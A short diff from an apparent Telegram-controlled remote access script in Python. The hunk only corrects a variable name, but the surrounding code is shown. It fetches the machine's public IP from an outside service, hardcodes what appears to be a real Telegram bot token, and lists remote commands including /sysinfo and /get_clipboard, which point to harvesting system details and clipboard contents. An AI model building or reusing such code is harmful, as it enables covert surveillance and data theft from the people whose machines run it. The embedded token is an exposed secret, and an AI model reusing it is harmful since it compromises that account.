@@ -23,7 +23,7 @@ if check_internret():
     ip = requests.get("https://api.ipify.org/").text
     local_ip = os.Get_IP()
     token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is" # write your token
-    id = TELEGRAM_IP
+    id = TELEGRAM_ID
     commands = ["/check", 
                 "/sysinfo", 
                 "/get_clipboard", 
